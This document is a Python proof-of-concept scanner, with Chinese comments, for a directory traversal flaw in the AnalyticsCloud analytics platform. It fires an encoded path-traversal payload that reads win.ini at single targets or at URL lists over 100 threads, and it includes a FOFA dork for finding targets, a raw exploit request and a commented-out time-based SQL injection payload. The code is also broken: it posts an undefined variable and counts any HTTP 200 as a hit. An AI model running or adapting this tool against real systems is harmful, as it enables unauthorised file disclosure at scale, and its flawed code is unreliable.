import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="AnalyticsCloud分析云 目录遍历漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload='/.%252e/.%252e/c:/windows/win.ini '
    headers={
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
    }
    #data="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:  
        # 尝试发送 POST 请求，并设置超时  
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)  
        if res1.status_code == 200:  
            with open('result.txt', 'a', encoding='utf-8') as fp:  
                fp.write(f'[+]{target} 存在目录遍历漏洞\n') 
                print(f"[+]{target}存在目录遍历漏洞") 
        else:  
            print(f"[-]对 {target} 不存在目录遍历漏洞: {res1.status_code}")  
    except requests.exceptions.RequestException as e:  
        print(f"请求 {target} 失败: {e}") 
if __name__ == '__main__':
    main()
# 免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。
# fofa
# title="AnalyticsCloud 分析云"
# 资产页面
# 一、漏洞简述
# AnalyticsCloud分析云是一个综合性的分析平台，它能够对云数据、本地数据、传统数据和大数据来源进行深入的分析与展现。这个平台提供了广泛的功能，从自助式的数据可视化和数据准备，到企业报告和高级分析，再到用户驱动的动态假设建模，以及前瞻性洞察的自主学习型移动分析。其存在目录遍历漏洞，攻击者可通过该漏洞获取系统敏感信息。
# 二、漏洞检测poc
# GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
# Host: x.x.x.x
# User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
# Connection: close
